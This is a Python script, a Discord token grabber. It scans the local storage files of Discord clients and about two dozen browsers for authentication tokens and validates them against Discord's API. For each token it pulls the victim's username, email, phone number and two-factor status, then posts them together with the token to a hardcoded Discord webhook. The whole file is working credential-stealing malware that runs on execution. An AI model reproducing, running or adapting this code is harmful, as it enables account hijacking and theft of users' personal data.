import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

class DiscordTokenGrabber:
    def __init__(self, webhook):
        self.webhook = webhook
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.tokens = []

    def extract_tokens(self):
        # Paths to check for Discord tokens
        paths = [
            os.getenv("localappdata") + '\\discord\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\discordcanary\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Lightcord\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\discordptb\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            os.getenv("localappdata") + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        ]

        for path in paths:
            if not os.path.exists(path):
                print(f"Path does not exist: {path}")
                continue
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                try:
                    with open(f'{path}\\{file_name}', 'r', errors='ignore') as file:
                        for line in file:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    self.tokens.append(token)
                                    print(f"Found token: {token}")
                except Exception as e:
                    print(f"Error reading file {file_name}: {e}")

    def validate_token(self, token: str) -> bool:
        try:
            r = requests.get(self.base_url, headers={'Authorization': token})
            return r.status_code == 200
        except Exception as e:
            print(f"Validation error: {e}")
            return False

    def upload_tokens(self):
        if not self.tokens:
            print("No tokens found.")
            return

        for token in self.tokens:
            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                username = user['username'] + '#' + user['discriminator']
                user_id = user['id']
                email = user['email']
                phone = user['phone']
                mfa = user['mfa_enabled']
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"

                embed = {
                    "title": f"{username} ({user_id})",
                    "color": 0x000000,
                    "thumbnail": {"url": avatar},
                    "fields": [
                        {"name": "Token", "value": f"```{token}```", "inline": False},
                        {"name": "Email", "value": email if email else "None", "inline": True},
                        {"name": "Phone", "value": phone if phone else "None", "inline": True},
                        {"name": "MFA", "value": mfa, "inline": True}
                    ]
                }

                requests.post(self.webhook, json={"embeds": [embed]})
            except Exception as e:
                print(f"Upload error: {e}")

# Example usage
webhook_url = "https://discord.com/api/webhooks/1337860504567418932/2HQhqG9eH6UgmEHowYa6UbqP9-1Ld89uMzvQc1-qXmetOuxGOB4riXZMHyzumsapR-Si"
grabber = DiscordTokenGrabber(webhook_url)
grabber.extract_tokens()
grabber.upload_tokens()
